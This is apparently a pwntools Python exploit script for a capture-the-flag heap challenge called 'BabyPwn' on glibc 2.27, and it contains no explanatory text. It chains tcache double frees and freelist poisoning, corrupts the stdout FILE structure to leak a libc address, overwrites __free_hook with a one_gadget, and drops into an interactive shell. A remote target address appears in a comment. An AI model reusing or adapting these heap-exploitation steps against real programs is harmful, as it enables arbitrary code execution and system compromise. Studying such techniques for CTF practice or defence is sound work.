from pwn import *

context.arch='amd64'
libc = ELF('./libc-2.27.so')

def add(name, size, content):
	r.sendlineafter(':', '1')
	r.sendlineafter(':', name)
	r.sendlineafter(':', str(size))
	r.sendafter(':', content)

def delete(idx):
	r.sendlineafter(':', '2')
	r.sendlineafter(':', str(idx))

def DEBUG():
	gdb.attach(r)

member = 0x602060
while True:
	try:
		r = process('./BabyPwn')
		#r = remote('124.156.209.69', 9999)
		add('0', 0x60, '0')
		add('1', 0x80, '1') 
		add('2', 0xa0, '2')

		DEBUG()
		
		delete(2)
		delete(2)
		delete(2)
		add('3', 0xa0, '\x20')
		add('4', 0xa0, '\x20')
		add('5fake1up', 0xa0, flat(0, 0xa1))

		delete(1)
		delete(5)
		add('6fake1up', 0x70, flat(0, 0x91))
		delete(1)
		delete(1)
		delete(5)

		add('7', 0x70, flat(0, 0x91, member+0x10))
		delete(7)
		add('8', 0x80, 'a')
		add('9', 0x80, p64(0)*8)

		for _ in range(8):
			delete(1)

		print "phase5"
		add('2', 0x80, '\x60\x97')
		#DEBUG()

		add('3', 0x90, 'a')
		add('4', 0x90, flat(0xfbad1880, 0, 0, 0)+'\x00')
		print "recving..."
		libc_base = u64(r.recvuntil('\x7f')[-6:]+'\x00'*2) - 0x3ed8b0
		free_hook = libc_base + libc.symbols['__free_hook']
		print "libc_base @ ", hex(libc_base)
		print "free_hook @ ", hex(free_hook)
		one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
		one_shot = libc_base + one_gadget[1]
		
		add('5', 0x10, 'a')
		delete(5)
		delete(5)
		add('6', 0x10, p64(free_hook))
		add('7', 0x10, p64(free_hook))
		add('8', 0x10, p64(one_shot))
		
		r.interactive()
		break

	except EOFError:
		r.close()
		pass
	except KeyboardInterrupt:
		r.close()
		break